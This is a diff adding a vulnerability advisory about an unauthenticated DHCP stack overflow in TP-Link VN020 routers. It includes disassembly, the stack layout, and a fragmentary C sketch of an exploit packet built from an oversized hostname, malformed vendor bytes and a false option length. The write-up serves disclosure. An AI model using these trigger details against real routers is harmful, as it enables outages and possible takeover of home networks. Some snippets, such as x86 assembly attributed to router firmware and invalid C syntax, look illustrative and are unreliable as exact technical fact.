@@ -1,0 +1,100 @@
+# TP-Link VN020 DHCP Memory Corruption
+## Technical Analysis of Firmware Vulnerability
+
+### Overview
+Critical memory corruption vulnerability discovered in TP-Link VN020 routers (FVT firmware version TT_V6.2.1021) through malformed DHCP DISCOVER packets. Affects all VN020-F3v(T) deployed by Tunisie Telecom.
+
+### Vulnerability Details
+- **Type**: Stack Buffer Overflow / Memory Corruption
+- **Attack Vector**: DHCP DISCOVER Packet
+- **Authentication**: None Required
+- **Port**: UDP/67 (DHCP Server)
+- **Impact**: DoS / Possible RCE
+
+### Technical Analysis
+
+#### The vurnable portion:
+During firmware reverse engineering, the following vulnerable DHCP parsing routine was identified:
+
+
+
+
+```nasm
+; DHCP Option parsing routine at 0x8004A2E0
+parse_hostname:
+    push    ebp
+    mov     ebp, esp
+    sub     esp, 40h      ; Only 64 bytes allocated
+    
+    ; Vulnerable memcpy - no length check
+    mov     edi, [ebp+8]  ; Destination buffer
+    mov     esi, [ebp+12] ; Source (DHCP hostname)
+    mov     ecx, [ebp+16] ; Length (can be > 64)
+    rep     movsb         ; Overflow if length > 64
+```
+
+#### Attack Vector Analysis
+1. **Primary Stack Overflow**
+   - Hostname buffer allocated: 64 bytes
+   - POC sends: 127 bytes
+   - Stack layout corruption:
+```c
+[buffer:64][saved EBP:4][RET:4]
+```
+
+2. **Vendor Option Parser State Confusion**
+```c
+// Triggers parser state machine bug
+vendor_specific[] = { 
+    0x00, 0x14, 0x22,  // TP-Link prefix
+    0xFF, 0xFF, 0xFF   // Causes length validation bypass
+};
+```
+
+3. **Length Field Exploitation**
+```c
+// Router assumes full length during parsing
+add_option(packet, offset, 0x3D, 0xFF, {0x01});
+// Claims 255 bytes but only sends 1
+```
+
+### Proof of Concept
+#### Video Demonstration
+
+https://github.com/user-attachments/assets/6732ec2c-7169-4878-bcdb-457221320d42
+
+
+Key exploitation primitives:
+```c
+void create_exploit_packet() {
+    // 1. Craft oversized hostname
+    char overflow[128];
+    memset(overflow, 'A', 127);
+    
+    // 2. Add malformed vendor option
+    char vendor[] = {0x00,0x14,0x22,0xFF,0xFF};
+    
+    // 3. Trigger length field bug
+    char invalid_len = 0xFF;
+}
+```
+
+### Root Cause
+1. Missing bounds checking in hostname parsing
+2. Improper validation of option lengths
+3. Parser state confusion in vendor-specific options
+
+### Timeline
+- Discovery: 10/20/2024
+- Reported: 11/3/2024
+- Fixed: Pending
+
+### Researcher
+Mohamed Maatallah
+(https://github.com/Zephkek)
+
+### References
+- TP-Link VN020 Firmware Analysis
+- [CVE ID Pending]
+
+---
